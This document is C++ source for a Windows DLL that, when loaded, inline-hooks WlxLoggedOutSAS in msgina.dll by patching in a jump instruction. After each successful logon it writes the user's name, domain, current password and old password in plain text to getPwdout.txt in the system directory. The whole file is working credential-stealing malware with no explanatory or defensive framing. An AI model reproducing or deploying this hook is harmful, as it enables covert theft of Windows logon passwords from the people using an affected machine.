#include "stdafx.h"
#include <stdio.h>
#include <fstream> 
#include <iostream>  
using namespace std; 
#define WLX_SAS_ACTION_LOGON	(1)  
typedef struct _WLX_MPR_NOTIFY_INFO
{
	PWSTR pszUserName;
	PWSTR pszDomain;
	PWSTR pszPassword;
	PWSTR pszOldPassword;
} WLX_MPR_NOTIFY_INFO, *PWLX_MPR_NOTIFY_INFO;
typedef int (WINAPI* WlxLoggedOutSAS)(PVOID pWlxContext, DWORD dwSasType, PLUID pAuthenticationId, PSID pLogonSid, PDWORD pdwOptions, PHANDLE phToken, PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, PVOID *pProfile);  
int WINAPI FunNewADDR(PVOID pWlxContext, DWORD dwSasType, PLUID pAuthenticationId, PSID pLogonSid, PDWORD pdwOptions, PHANDLE phToken, PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, PVOID *pProfile);
#pragma pack(1) 
struct HookTable
{
private:
	HMODULE hMsgina;
	WlxLoggedOutSAS OldADDR;
	WlxLoggedOutSAS NewADDR;
	unsigned char charOldCode[6];
	unsigned char charJmpCode[6];
public:
	VOID UnHookWlxLoggedOutSAS();
	VOID WriteLog(PWLX_MPR_NOTIFY_INFO pNprNotifyInfo);
	DWORD WINAPI StartHook(LPVOID lpParam);
	VOID HookWlxLoggedOutSAS();
	int WINAPI FunNewADDR(PVOID pWlxContext, DWORD dwSasType, PLUID pAuthenticationId, PSID pLogonSid, PDWORD pdwOptions, PHANDLE phToken, PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, PVOID *pProfile);
};
HookTable hooktable = { 0, 0, &FunNewADDR, "\x8b\xff\x55\x8B\xEC", "\xE9\x00\x00\x00\x00" };
#pragma pack() 
int WINAPI HookTable::FunNewADDR(PVOID pWlxContext, DWORD dwSasType, PLUID pAuthenticationId, PSID pLogonSid, PDWORD pdwOptions, PHANDLE phToken, PWLX_MPR_NOTIFY_INFO pNprNotifyInfo, PVOID *pProfile)
{
	UnHookWlxLoggedOutSAS();
	int i = hooktable.OldADDR(pWlxContext, dwSasType, pAuthenticationId, pLogonSid, pdwOptions, phToken, pNprNotifyInfo, pProfile);
	if (i == WLX_SAS_ACTION_LOGON)
	{
		WriteLog(pNprNotifyInfo);
	}
	return i;
}
VOID HookTable::WriteLog(PWLX_MPR_NOTIFY_INFO pNprNotifyInfo)
{
	char szSystemDir[MAX_PATH] = { 0 };
	GetSystemDirectory(szSystemDir, MAX_PATH - 1);
	char szFilePath[MAX_PATH] = { 0 };
	strcat_s(szFilePath, szSystemDir);
	strcat_s(szFilePath, "\\getPwdout.txt");
	ofstream outfile; outfile.open(szFilePath);
	char szContent[1024 * 4] = { 0 };
	sprintf_s(szContent, "username:%ws\nDomain:%ws\npassword:%ws\nOldPassword:%ws\n\n", pNprNotifyInfo->pszUserName, pNprNotifyInfo->pszDomain, pNprNotifyInfo->pszPassword, pNprNotifyInfo->pszOldPassword);
	outfile.write(szContent, strlen(szContent));
	outfile.close();
}
VOID HookTable::HookWlxLoggedOutSAS()
{
	DWORD OldProcte;
	VirtualProtect(hooktable.OldADDR, 5, PAGE_EXECUTE_READWRITE, &OldProcte);
	unsigned char *p = (unsigned char*)hooktable.OldADDR;
	for (int i = 0; i < 5; i++)
	{
		p[i] = hooktable.charJmpCode[i];
	}
	VirtualProtect(hooktable.OldADDR, 5, OldProcte, &OldProcte);
	return;
}
VOID HookTable::UnHookWlxLoggedOutSAS()
{
	DWORD OldProcte;
	VirtualProtect(hooktable.OldADDR, 5, PAGE_EXECUTE_READWRITE, &OldProcte);
	unsigned char *p = (unsigned char*)hooktable.OldADDR;
	for (int i = 0; i < 5; i++)
	{
		p[i] = hooktable.charOldCode[i];
	}
	VirtualProtect(hooktable.OldADDR, 5, OldProcte, &OldProcte);
	return;
}
DWORD WINAPI HookTable::StartHook(LPVOID lpParam)
{
	
	int n = 0;
	hooktable.hMsgina = LoadLibrary("msgina.dll");
	n = GetLastError();
	if (NULL == hooktable.hMsgina)
	{
		printf("getmoduleHandle msgina.dll error");
		return -1;
	} 
	hooktable.OldADDR = (WlxLoggedOutSAS)GetProcAddress(hooktable.hMsgina, "WlxLoggedOutSAS");
	if (NULL == hooktable.OldADDR)
	{
		printf("GetProcAddress WlxLoggedOutSAS error");
		return -1;
	}
	int *OpCode = (int*)&hooktable.charJmpCode[1];
	int Code = (int)hooktable.NewADDR - (int)hooktable.OldADDR - 5;
	*OpCode = Code; HookWlxLoggedOutSAS(); return 0;
}
extern "C" __declspec(dllexport)
void start() { return; }
BOOL WINAPI DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			hooktable.StartHook(NULL);
			break;
		}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

